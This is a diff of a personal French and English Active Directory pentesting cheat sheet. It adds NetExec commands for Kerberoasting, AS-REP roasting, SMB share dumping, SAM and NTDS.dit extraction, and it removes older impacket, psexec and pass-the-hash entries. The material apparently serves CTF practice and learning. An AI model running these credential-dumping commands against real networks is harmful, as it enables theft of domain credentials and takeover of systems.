@@ -10,106 +10,100 @@ Ce document regroupe tout ce que j’ai appris au travers des box et des cours d
 
 ### 📌 Reconnaissance & Énumération
 
-#### 🔍 **LDAP Enumeration**
+<details>
+
+<summary>🔍LDAP <strong>Enumeration</strong></summary>
 
 *   **Énumération LDAP anonyme**
 
     ```bash
     ldapsearch -v -x -b "DC=<DOMAIN>,DC=com" -H "ldap://<IP>" "(objectclass=*)"
     ```
-*   **Énumération LDAP authentifiée (LAPS Password)**
+*   **Énumération LDAP auth (LAPS Password)**
 
     ```bash
     ldapsearch -x -H "ldap://<IP>" -D "<DOMAIN>\<USER>" -w "<PASSWORD>" -b "DC=<DOMAIN>,DC=com" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
     ```
-*   **Énumération avec Windapsearch**
+*   **Énumération with Windapsearch**
 
     ```bash
     ./windapsearch.py --dc-ip <IP> -u "" -U
     ```
-*   **Extraction des utilisateurs via NetExec**
+*   **Extraction of users and descriptions via NetExec**
 
     ```bash
-    nxc ldap "<DC>" -d "<DOMAIN>" -u "<USER>" -p "<PASSWORD>" -M get-desc-users
+    #users
+    nxc ldap $ip -u $user -p $password --users
+    #desc
+    nxc ldap "<DC>" -d "<DOMAIN>" -u "<USER>" -p "<PASSWORD>" -M get-desc
+    ```
+*   **Testing if an account exists without kerberos protocol**
+
+    ```bash
+    nxc ldap 192.168.1.0/24 -u users.txt -p '' -k
+    #mode 18200 hashcat
+    ```
+*   **Asreproasting**
+
+    ```bash
+    nxc ldap 192.168.0.104 -u harry -p '' --asreproast output.txt
+    ```
+*   **Kerberoasting**
+
+    ```bash
+    nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
+    #mode 13100 hashcat
+    ```
+*   **Bloodhound collector**
+
+    ```bash
+    nxc ldap <ip> -u user -p pass --bloodhound --collection All
     ```
 
-#### 📂 **SMB Enumeration**
+Rest later
 
-*   **Lister les partages SMB accessibles**
+</details>
+
+<details>
+
+<summary>📂 SMB Enumeration</summary>
+
+*   **List SMB Shares**
 
     ```bash
     crackmapexec smb <IP> --shares -u <USER> -p <PASSWORD>
     ```
-*   **Brute force RID pour extraire les utilisateurs**
+*   **Brute force RID for user enumeration**
 
     ```bash
-    nxc smb <IP> -u '' -p '' --rid-brute
+    nxc smb <IP> -u '' -p '' --rid-brut
     ```
-
-#### 🎭 **SPN & Kerberoasting**
-
-*   **Extraction des SPN**
+*   **List SMB shares anonymous**
 
     ```bash
-    impacket-GetUserSPNs -dc-ip <IP> <DOMAIN>/<USER>:<PASSWORD> -request
+    smbclient -L //<IP> -N
     ```
-*   **Lister les SPN d'un compte spécifique**
-
-    ```powershell
-    Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
-    ```
-
-#### 💾 **MSSQL Enumeration**
-
-*   **Connexion MSSQL avec authentification Windows**
+*   **Dumping all files in the share**
 
     ```bash
-    impacket-mssqlclient '<DOMAIN>/<USER>':'<PASSWORD>'@<IP> -dc-ip <IP> -windows-auth
+    nxc smb 10.10.10.10 -u 'user' -p 'pass' -M spider_plus -o DOWNLOAD_FLAG=True
     ```
-
-***
-
-### 🔑 Accès Initial (Foothold)
-
-*   **RCE via PSExec (Administrator Privileges)**
+*   **Dump SAM with admin privileges (--local-auth possible)**
 
     ```bash
-    python psexec.py <DOMAIN>/<ADMIN>:<PASSWORD>@<IP>
+    nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam
     ```
-*   **Pass-the-Hash via Evil-WinRM**
+*   **Dump NTDS.dit with DomainAdmin or Local Admin**
 
     ```bash
-    evil-winrm -i <IP> -u <USER> -H "<NTLM_HASH>"
-    ```
-*   **Connexion MSSQL avec Silver Ticket**
-
-    ```bash
-    impacket-mssqlclient -k <MSSQL_HOST>
+    nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' -M ntdsutil
     ```
 
-***
+There are plenty of Credentials discovery commands, no need to put everything, commands here: [https://www.netexec.wiki/smb-protocol/obtaining-credentials](https://www.netexec.wiki/smb-protocol/obtaining-credentials)
 
-### 🏆 Escalade de Privilèges (PrivEsc)
+</details>
 
-*   **Dump de la base SAM**
-
-    ```powershell
-    reg save hklm\sam C:\Temp\sam
-    ```
-*   **Dump de la base SYSTEM**
-
-    ```powershell
-    reg save hklm\system C:\Temp\system
-    ```
-*   **Extraction des hashes NTLM**
-
-    ```bash
-    impacket-secretsdump -system system -sam sam local
-    ```
-
-```bash
-impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<IP>
-```
+####
 
 #### 🎯 **Droits Windows (Privilege Escalation)**
 
